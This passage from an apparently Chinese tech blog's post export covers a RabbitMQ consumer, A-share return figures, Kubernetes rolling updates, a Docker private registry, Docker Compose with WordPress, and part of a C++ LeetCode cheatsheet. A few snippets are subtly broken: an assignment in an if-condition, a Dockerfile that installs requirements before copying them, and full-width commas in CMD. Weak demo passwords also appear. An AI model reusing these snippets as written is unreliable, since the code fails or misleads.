<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import pika</span><br><span class="line"></span><br><span class="line">credentials = pika.PlainCredentials(&quot;admin&quot;, &quot;your_password@xdr&quot;)</span><br><span class="line">connection = pika.BlockingConnection(pika.ConnectionParameters(&#x27;localhost&#x27;, credentials=credentials))</span><br><span class="line"></span><br><span class="line">channel = connection.channel()</span><br><span class="line"></span><br><span class="line">channel.queue_declare(queue=&#x27;hello&#x27;)</span><br><span class="line"></span><br><span class="line">def callback(ch, method, properties, body):</span><br><span class="line">    print(&quot; [x] Received %r&quot; % body)</span><br><span class="line"></span><br><span class="line">channel.basic_consume(queue=&quot;hello&quot;, on_message_callback=callback, auto_ack=True)</span><br><span class="line"></span><br><span class="line">print(&#x27; [*] Waiting for messages. To exit press CTRL+C&#x27;)</span><br><span class="line">channel.start_consuming()</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://www.cnblogs.com/eagle6688/p/17437095.html">RockyLinux 安装RabbitMQ</a><br>【2】 <a href="https://pengpengxp.github.io/archive/before-2018-11-10/2016-12-05-pika-and-rabbitmq.html">使用python的pika库来操作rabbitmq</a></p>
]]></content>
      <categories>
        <category>RabbitMQ</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>过去15年A股的收益率如何?</title>
    <url>/2024/1229141431.html</url>
    <content><![CDATA[<p>来看一张经典的图<br></p>
<span id="more"></span>
<p><img data-src="/2024/1229141431/image1.png"></p>
<p>这张图统计了从09年到24年，共15年时间里，全球主要资产的回报率。 横轴是年化波动率，纵轴为年化回报率。</p>
<p>这张图的重点被三个红色箭头标注</p>
<ul>
<li>最上面的是美国股票, 收益为15%, 波动率不到15%。简单地买入并持有就能获得丰厚的回报。</li>
<li>最右边的是中国股票, 收益仅为4%+, 波动率却高达25%。<font color="red">最低的收益+最高的波动率，这注定了只有极少数人赚大钱，绝大多数人亏钱。</font></li>
<li>最左边的是中国债券，收益也是4%+, 但波动率仅有3%。这说明国内玩债的，才是真正的聪明资金。</li>
</ul>
<p> </p>
<p>我曾经拿沪深300算过，以10年为周期买入并持有，年化收益率平均在4%，大家在网上搜回测数据会得到同样的结果。也就是说, 如果一个散户在过去几年只是满仓持有中国股票，他的收益大概率会很差。</p>
<p>细心的朋友会发现这张图里还有三个资产组合，这三个组合加入了一定比例的中国债券和海外股票。你会发现从组合1到组合3, <font color="red">中国股票含量越低，年化波动率越小，收益率越高</font>。其中组合3的收益率达到6%，年化波动率不到15%。</p>
<p>要记住，<font color="red">除了买个股，你还可以在A股账户里买债券基金, 美股基金, 可转债</font>，这点非常重要。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Kubernetes滚动更新实践</title>
    <url>/2025/0101215640.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>在我之前的项目中，对微服务升级采用的做法是删除整个namespace， 再重新应用所有yaml。 这种方式简单粗暴，但是不可避免的导致服务中断，影响了用户体验<br>为了解决更新服务导致的服务中断问题， Kubernetes提供了一种有效的服务升级方式 —— 滚动更新(Rolling Update)</p>
<h1><span id="什么是滚动更新rollingupdate">什么是滚动更新(RollingUpdate)</span></h1><p>滚动更新是一种部署策略。 允许用户逐步替换旧的Pod实例为新版本，而不是一次性替换所有Pod，从而实现零停机时间的部署更新。 解决了如下问题:</p>
<ul>
<li>最小化停机时间， 滚动更新可以在不完全停止服务情况下进行，提高用户体验</li>
<li>故障恢复， 如果新版本出现问题，可以迅速回滚到之前的稳定版本</li>
<li>平滑流量迁移， 避免瞬间全部更新导致的流量冲击和服务中断</li>
</ul>
<p>RollingUpdate策略有两个重要参数：</p>
<ul>
<li>maxUnavailable， 滚动更新时最多可以有多少个Pod不可用。 默认值为25%，这意味着如果有一个包含4个Pod的服务， 更新期间至少有3个Pod可用</li>
<li>maxSurge， 滚动更新时可以临时超出期望副本数的额外Pod数， 默认值为25%</li>
</ul>
<p>说明: 对于关键业务， 可以用保守的设置， 比如maxUnavailable&#x3D;0， maxSurge&#x3D;1; 较大的maxSurge可以加快更新速度，但增加了集群压力; 根据实际情况调整这两个参数</p>
<h2><span id="实践案例">实践案例</span></h2><p>写一个简单的微服务， Pod副本数设置为5， 观察Kubernetes滚动更新过程</p>
<span id="more"></span>

<p>1、首先创建一个简单微服务<br>创建Flask的app.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello v1!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>写一个Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM python:3.9-slim</span><br><span class="line">RUN pip install --no-cache-dir -r requirements.txt</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . /app</span><br><span class="line">EXPOSE 5000</span><br><span class="line">ENV FLASK_APP=app.py</span><br><span class="line">CMD [&quot;flask&quot;， &quot;run&quot;， &quot;--host=0.0.0.0&quot;]</span><br></pre></td></tr></table></figure>
<p>构建镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t flask-app:1.0 .</span><br><span class="line">docker save flask-app:1.0 &gt; flask-app-1_0.tar</span><br></pre></td></tr></table></figure>

<p>2、 微服务部署到k8s<br>创建一个Deployment</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: flask-app</span><br><span class="line">spec:</span><br><span class="line">  replicas: 5</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: flask-app</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: flask-app</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: flask-app</span><br><span class="line">        image: docker.io/library/flask-app:1.0</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 5000</span><br></pre></td></tr></table></figure>
<p>创建Service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: flask-service</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort</span><br><span class="line">  selector:</span><br><span class="line">    app: flask-app</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 5000</span><br></pre></td></tr></table></figure>

<p>3、 执行滚动更新<br>改一下第一步的app.py， 构建第二个镜像， 用于测试滚动更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t flask-app:2.0 .</span><br><span class="line">docker save flask-app:2.0 &gt; flask-app-2_0.tar</span><br></pre></td></tr></table></figure>
<p>执行滚动更新</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl set image deployment/flask-app flask-app=docker.io/library/flask-app:2.0</span><br></pre></td></tr></table></figure>

<p>4、 观察滚动更新过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout status deployment/flask-app</span><br></pre></td></tr></table></figure>
<p>同时， 用watch查看滚动更新过程， 可以看出Pod是一边创建一边删除的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">watch kubectl get pods</span><br><span class="line"></span><br><span class="line">Every 2.0s: kubectl get pods                                                                                                                                                                                                         localhost.localdomain: Sat Mar  8 18:43:27 2025</span><br><span class="line">NAME                         READY   STATUS        RESTARTS   AGE</span><br><span class="line">flask-app-585869cc8f-27csx   1/1     Running       0          6s</span><br><span class="line">flask-app-585869cc8f-46jps   1/1     Running       0          3s</span><br><span class="line">flask-app-585869cc8f-bnbg7   1/1     Running       0          5s</span><br><span class="line">flask-app-585869cc8f-c9gwx   1/1     Running       0          6s</span><br><span class="line">flask-app-585869cc8f-klwrn   1/1     Running       0          4s</span><br><span class="line">flask-app-6bc5857dc8-2r2l6   1/1     Terminating   0          63s</span><br><span class="line">flask-app-6bc5857dc8-9q4vc   1/1     Terminating   0          63s</span><br><span class="line">flask-app-6bc5857dc8-9vjds   1/1     Terminating   0          61s</span><br><span class="line">flask-app-6bc5857dc8-mxqjg   1/1     Terminating   0          61s</span><br><span class="line">flask-app-6bc5857dc8-wvrbl   1/1     Terminating   0          63s</span><br></pre></td></tr></table></figure>

<p>5、 滚动回滚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl rollout undo deployment/flask-app</span><br></pre></td></tr></table></figure>

<p>注: 除了改变镜像， 如果对deployment其他部分做了修改， 同样可以触发滚动更新。 通过kubectl apply更新Deployment， 再<code>watch kubectl get pods</code>观察滚动更新过程</p>
<h1><span id="参考">参考</span></h1><p><a href="https://kubernetes.io/docs/tutorials/kubernetes-basics/update/update-intro/">https://kubernetes.io/docs/tutorials/kubernetes-basics/update/update-intro/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>手把手教你搭建Docker私有仓库</title>
    <url>/2025/0102171058.html</url>
    <content><![CDATA[<!-- toc -->

<ul>
<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">测试环境</a></li>
<li><a href="#%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4">搭建步骤</a><ul>
<li><a href="#%E5%AE%89%E8%A3%85docker">安装Docker</a></li>
<li><a href="#%E6%8B%89%E5%8F%96registry%E5%AE%B9%E5%99%A8">拉取Registry容器</a></li>
<li><a href="#%E9%85%8D%E7%BD%AEhttps">配置HTTPS</a></li>
<li><a href="#%E6%89%80%E6%9C%89%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BF%A1%E4%BB%BB%E8%AF%81%E4%B9%A6">所有客户端信任证书</a></li>
<li><a href="#%E9%85%8D%E7%BD%AEbasic%E8%AE%A4%E8%AF%81">配置Basic认证</a></li>
<li><a href="#%E5%90%AF%E5%8A%A8registry%E5%AE%B9%E5%99%A8">启动Registry容器</a></li>
<li><a href="#%E6%B5%8B%E8%AF%95%E7%A7%81%E6%9C%89registry">测试私有Registry</a></li>
</ul>
</li>
<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
</ul>
<!-- tocstop -->

<span id="more"></span>

<h1><span id="测试环境">测试环境</span></h1><p>Rocky Linux 9.5 x86_64</p>
<h1><span id="搭建步骤">搭建步骤</span></h1><h2><span id="安装docker">安装Docker</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y docker</span><br><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br><span class="line">docker --version</span><br><span class="line">Docker version 27.4.0, build bde2b89</span><br></pre></td></tr></table></figure>

<h2><span id="拉取registry容器">拉取Registry容器</span></h2><p>Docker官方提供了一个名为registry的容器镜像，可直接用来运行私有仓库. 先拉取registry镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull registry:2</span><br></pre></td></tr></table></figure>

<h2><span id="配置https">配置HTTPS</span></h2><p>生成一个包含SANs的自签名证书. 先创建一个OpenSSL配置文件(openssl.cnf), 指定CN为你的域名(mydockerregistry.com)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ req ]</span><br><span class="line">default_bits       = 2048</span><br><span class="line">distinguished_name = req_distinguished_name</span><br><span class="line">req_extensions     = req_ext</span><br><span class="line">prompt             = no</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line">C  = CN</span><br><span class="line">ST = State</span><br><span class="line">L  = City</span><br><span class="line">O  = Organization</span><br><span class="line">OU = Organizational Unit</span><br><span class="line">CN = mydockerregistry.com</span><br><span class="line"></span><br><span class="line">[ req_ext ]</span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line"></span><br><span class="line">[ alt_names ]</span><br><span class="line">DNS.1 = mydockerregistry.com</span><br><span class="line">DNS.2 = localhost</span><br><span class="line">IP.1 = 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>生成证书和密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p /mnt/certs</span><br><span class="line">openssl req -x509 -config openssl.cnf -extensions &#x27;req_ext&#x27; -nodes -days 365 -newkey rsa:2048 -keyout /mnt/certs/domain.key -out /mnt/certs/domain.crt</span><br></pre></td></tr></table></figure>
<p>按照提示填写信息，确保Common Name(CN)设置私有Registry的域名或IP</p>
<h2><span id="所有客户端信任证书">所有客户端信任证书</span></h2><p>在所有docker客户端机器上执行如下命令, 信任证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker/certs.d/mydockerregistry.com:5000/</span><br><span class="line">sudo cp /mnt/certs/domain.crt /etc/docker/certs.d/mydockerregistry.com:5000/ca.crt</span><br></pre></td></tr></table></figure>

<h2><span id="配置basic认证">配置Basic认证</span></h2><p>为了保护私有Registry，可以启用基本的用户名密码验证</p>
<p>创建密码文件, 使用htpasswd工具创建一个用户名和密码文件(用户名:dockeruser, 密码:123456)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install httpd-tools -y</span><br><span class="line">mkdir -p /mnt/auth</span><br><span class="line">htpasswd -Bc /mnt/auth/htpasswd dockeruser</span><br></pre></td></tr></table></figure>

<h2><span id="启动registry容器">启动Registry容器</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br><span class="line">docker run -d \</span><br><span class="line">  --name private-registry \</span><br><span class="line">  -p 5000:5000 \</span><br><span class="line">  --restart=always \</span><br><span class="line">  -v /mnt/registry:/var/lib/registry \</span><br><span class="line">  -v /mnt/certs:/certs \</span><br><span class="line">  -v /mnt/auth:/auth \</span><br><span class="line">  -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt \</span><br><span class="line">  -e REGISTRY_HTTP_TLS_KEY=/certs/domain.key \</span><br><span class="line">  -e REGISTRY_AUTH=htpasswd \</span><br><span class="line">  -e REGISTRY_AUTH_HTPASSWD_REALM=&quot;Registry Realm&quot; \</span><br><span class="line">  -e REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd \</span><br><span class="line">  registry:2</span><br></pre></td></tr></table></figure>
<p>说明：</p>
<ul>
<li><code>-d</code>：后台运行容器</li>
<li><code>-p 5000:5000</code>：将宿主机的 5000 端口映射到容器的 5000 端口</li>
<li><code>-v /mnt/registry:/var/lib/registry</code>：将本地目录<code>/mnt/registry</code>挂载到容器内的<code>/var/lib/registry</code>目录，用于存储镜像数据（请确保该目录存在）</li>
<li><code>--restart=always</code>: 保证容器在主机重启或意外停止后自动启动</li>
</ul>
<h2><span id="测试私有registry">测试私有Registry</span></h2><p>假设我本地有个镜像flask-app:1.0, 需要推送到私有registry, 操作如下：</p>
<p>登录私有Docker registry</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login -u dockeruser -p 123456 mydockerregistry.com:5000</span><br></pre></td></tr></table></figure>
<p>给镜像打标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker tag flask-app:1.0 mydockerregistry.com:5000/flask-app:1.0</span><br></pre></td></tr></table></figure>
<p>再推送镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push mydockerregistry.com:5000/flask-app:1.0</span><br></pre></td></tr></table></figure>
<p>最后, 在所有客户端机器上测试拉取镜像功能OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 信任证书</span><br><span class="line">mkdir -p /etc/docker/certs.d/mydockerregistry.com:5000/</span><br><span class="line">scp root@mydockerregistry.com:/mnt/certs/domain.crt /etc/docker/certs.d/mydockerregistry.com:5000/ca.crt</span><br><span class="line"></span><br><span class="line"># 登录</span><br><span class="line">docker login -u dockeruser -p 123456 mydockerregistry.com:5000</span><br><span class="line"></span><br><span class="line"># 测试拉取镜像</span><br><span class="line">docker pull mydockerregistry.com:5000/flask-app:1.0</span><br><span class="line">1.0: Pulling from flask-app</span><br><span class="line">486dbf987c66: Pull complete</span><br><span class="line">1da0723265ec: Pull complete</span><br><span class="line">4f4cb1a24c66: Pull complete</span><br><span class="line">c876ae22765e: Pull complete</span><br><span class="line">577bd6ae1def: Pull complete</span><br><span class="line">c9ecf2eab7f4: Pull complete</span><br><span class="line">a0bf88afd1f2: Pull complete</span><br><span class="line">Digest: sha256:5e7112644017b0713e4529de43868fc498c1d2dbdefab236e3d64cc11cd036e0</span><br><span class="line">Status: Downloaded newer image for mydockerregistry.com:5000/flask-app:1.0</span><br><span class="line">mydockerregistry.com:5000/flask-app:1.0</span><br></pre></td></tr></table></figure>

<h1><span id="参考">参考</span></h1><p><a href="https://yeasy.gitbook.io/docker_practice/repository/registry">https://yeasy.gitbook.io/docker_practice&#x2F;repository&#x2F;registry</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 Docker Compose 在单节点部署多容器</title>
    <url>/2025/0104225437.html</url>
    <content><![CDATA[<h1><span id="docker-compose-是什么">Docker Compose 是什么</span></h1><p>Docker Compose 是一个用于运行多容器应用的工具, 通过一个<code>docker-compose.yml</code>文件, 配置应用的服务、网络和卷，然后使用简单的命令启动或停止所有服务</p>
<h1><span id="为什么需要-docker-compose">为什么需要 Docker Compose</span></h1><p>当你有一个包含多个相互依赖的容器应用时，手动管理每个服务的启动、停止以及配置会比较复杂且容易出错<br>Docker Compose 提供了一种更简便的方法, 在单节点部署多个容器, 使得开发测试环境的一致性得到保证，同时简化了部署过程</p>
<h1><span id="示例-使用docker-compose-部署一个wordpress站点">示例: 使用Docker Compose 部署一个WordPress站点</span></h1><p>下面演示如何使用 Docker Compose 在单个节点上部署一个包含 WordPress 和 MySQL 的简单网站。</p>
<h2><span id="1-安装docker-compose">1. 安装Docker Compose</span></h2><p>官网上查找匹配版本安装, 我直接取最新版本安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -L &quot;https://github.com/docker/compose/releases/download/v2.34.0/docker-compose-linux-x86_64&quot; -o /usr/local/bin/docker-compose</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">docker-compose version</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="2-创建docker-composeyml文件">2. 创建<code>docker-compose.yml</code>文件</span></h2><p>在你的项目目录下创建一个名为 docker-compose.yml 的文件，并添加如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3.8&#x27;</span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.7</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_ROOT_PASSWORD: example</span><br><span class="line">      MYSQL_DATABASE: wordpress</span><br><span class="line">      MYSQL_USER: wordpress</span><br><span class="line">      MYSQL_PASSWORD: wordpress</span><br><span class="line">    volumes:</span><br><span class="line">      - db_data:/var/lib/mysql</span><br><span class="line">    restart: always</span><br><span class="line"></span><br><span class="line">  wordpress:</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    image: wordpress:latest</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;8080:80&quot;</span><br><span class="line">    environment:</span><br><span class="line">      WORDPRESS_DB_HOST: db:3306</span><br><span class="line">      WORDPRESS_DB_USER: wordpress</span><br><span class="line">      WORDPRESS_DB_PASSWORD: wordpress</span><br><span class="line">      WORDPRESS_DB_NAME: wordpress</span><br><span class="line">    volumes:</span><br><span class="line">      - wordpress_data:/var/www/html</span><br><span class="line">    restart: always</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  db_data:</span><br><span class="line">  wordpress_data:</span><br></pre></td></tr></table></figure>
<p>这个yaml文件定义了两个服务：一个是 MySQL 数据库，另一个是 WordPress 应用程序, 同时我们定义了两个存储卷来持久化数据</p>
<h2><span id="3-启动服务">3. 启动服务</span></h2><p>在 docker-compose.yml 文件所在的目录中执行以下命令以启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">[+] Running 3/3</span><br><span class="line"> ✔ Network docker-compose_default        Created                                                                                                                                                                             0.1s</span><br><span class="line"> ✔ Container docker-compose-db-1         Started                                                                                                                                                                             0.3s</span><br><span class="line"> ✔ Container docker-compose-wordpress-1  Started</span><br></pre></td></tr></table></figure>
<p>访问 <code>http://localhost:8080</code> 查看 WordPress 网站</p>
<h2><span id="4-停止服务">4. 停止服务</span></h2><p>使用<code>docker-compose down</code>命令, 即可一键停止服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br><span class="line">[+] Running 3/3</span><br><span class="line"> ✔ Container docker-compose-wordpress-1  Removed                                                                                                                                                                             1.2s</span><br><span class="line"> ✔ Container docker-compose-db-1         Removed                                                                                                                                                                             1.7s</span><br><span class="line"> ✔ Network docker-compose_default        Removed</span><br></pre></td></tr></table></figure>

<h1><span id="docker-compose-的优点">Docker Compose 的优点</span></h1><p>通过上述示例可以看出，Docker Compose 极大地简化了多容器应用的部署流程, 优点如下:</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">直接使用Docker</th>
<th align="left">使用Docker Compose</th>
</tr>
</thead>
<tbody><tr>
<td align="left">配置管理</td>
<td align="left">每个容器的配置分散在多个命令中，容易出错且难以维护</td>
<td align="left">配置集中在docker-compose.yml文件，便于维护和分享</td>
</tr>
<tr>
<td align="left">一键操作</td>
<td align="left">需要分别运行多条命令来启动、停止容器，效率低</td>
<td align="left">使用一条命令(如 <code>docker-compose up</code> 或 <code>docker-compose down</code>) 即可完成整个应用的管理</td>
</tr>
<tr>
<td align="left">依赖管理</td>
<td align="left">需要手动指定容器之间的依赖关系(如–link)，容易出错</td>
<td align="left">使用depends_on处理依赖关系</td>
</tr>
<tr>
<td align="left">存储卷操作</td>
<td align="left">需要手动创建和挂载存储卷</td>
<td align="left">在 docker-compose.yml 中定义存储卷，自动管理持久化数据</td>
</tr>
</tbody></table>
<h1><span id="参考">参考</span></h1><p><a href="https://juejin.cn/post/7042663735156015140">https://juejin.cn/post/7042663735156015140</a></p>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode cheetsheet for C++</title>
    <url>/2025/0106201917.html</url>
    <content><![CDATA[<h1><span id="数组vector">数组(vector)</span></h1><h2><span id="初始化">初始化</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; v(size);</span><br><span class="line">vector&lt;int&gt; v(size, init_value);</span><br><span class="line">v.emplace_back(a.begin(), a.begin() + 3); # 用另一个vector的某一区间初始化vector</span><br></pre></td></tr></table></figure>


<h2><span id="遍历数组">遍历数组</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 0; i &lt; vec.size(); ++i) &#123;</span><br><span class="line">	vec[i] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="数组追加到另一个数组">数组追加到另一个数组</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vec1.insert(vec1.end(), vec2.begin(), vec2.end());</span><br></pre></td></tr></table></figure>

<h2><span id="排序数组去重">排序数组+去重</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort(nums.begin(), nums.end());</span><br><span class="line">nums.erase(unique(nums.begin(), nums.end()), nums.end());</span><br></pre></td></tr></table></figure>

<h2><span id="逆序排序">逆序排序</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort(nums.begin(), nums.end(), greater&lt;int&gt;());</span><br></pre></td></tr></table></figure>

<h2><span id="二维vector初始化">二维vector初始化</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;bool&gt;&gt; visited(rows, vector&lt;bool&gt;(cols, false));</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h1><span id="链表">链表</span></h1><h2><span id="反转链表">反转链表</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ListNode* reverseList(ListNode* head) &#123;</span><br><span class="line">    if (head == nullptr || head-&gt;next == nullptr) return head;</span><br><span class="line"></span><br><span class="line">    ListNode *prev = nullptr;</span><br><span class="line">    ListNode *cur = head;</span><br><span class="line">    ListNode *tmp = nullptr;</span><br><span class="line">    while (cur != nullptr) &#123;</span><br><span class="line">        tmp = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = prev;</span><br><span class="line">        prev = cur;</span><br><span class="line">        cur = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    return prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="快慢指针找中间节点">快慢指针找中间节点</span></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">middleNode</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span> || head-&gt;next = <span class="literal">nullptr</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode *fast = head;</span><br><span class="line">        ListNode *slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (fast != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                fast = fast-&gt;next;</span><br><span class="line">				slow = slow-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2><span id="双向链表节点定义">双向链表节点定义</span></h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">DLinkedNode</span> &#123;</span><br><span class="line">    DLinkedNode *prev;</span><br><span class="line">    DLinkedNode *next;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="built_in">DLinkedNode</span>(): <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">value</span>(<span class="number">0</span>), <span class="built_in">prev</span>(<span class="literal">nullptr</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">DLinkedNode</span>(<span class="type">int</span> k, <span class="type">int</span> v): <span class="built_in">key</span>(k), <span class="built_in">value</span>(v), <span class="built_in">prev</span>(<span class="literal">nullptr</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1><span id="队列queue">队列(Queue)</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">queue&lt;int&gt; q;</span><br><span class="line">q.front() #队首</span><br><span class="line">q.push()</span><br><span class="line">q.pop()</span><br><span class="line">q.size()</span><br><span class="line">q.empty()</span><br></pre></td></tr></table></figure>

<h1><span id="双端队列deque">双端队列(Deque)</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deque&lt;int&gt; dq;</span><br><span class="line">dq.push_back(x);</span><br><span class="line">dq.pop_back();</span><br><span class="line">dq.pop_front();</span><br><span class="line">dq.front();</span><br><span class="line">dq.back();</span><br><span class="line">for (auto iter = dq.begin(); iter != dq.end(); ++iter) &#123;</span><br><span class="line">	*iter</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="优先级队列x2f堆priority_queue">优先级队列&#x2F;堆(priority_queue)</span></h1><h2><span id="求第k大的数">求第k大的数</span></h2><ul>
<li>大根堆: 建大小为n的堆, 弹出k-1次，堆顶为第k大的数</li>
<li>小根堆: 维护大小为k的堆，取堆顶元素</li>
</ul>
<p>大根堆(默认)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">	priority_queue&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;, less&lt;<span class="type">int</span>&gt;&gt; pq;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">		pq.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">		pq.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pq.<span 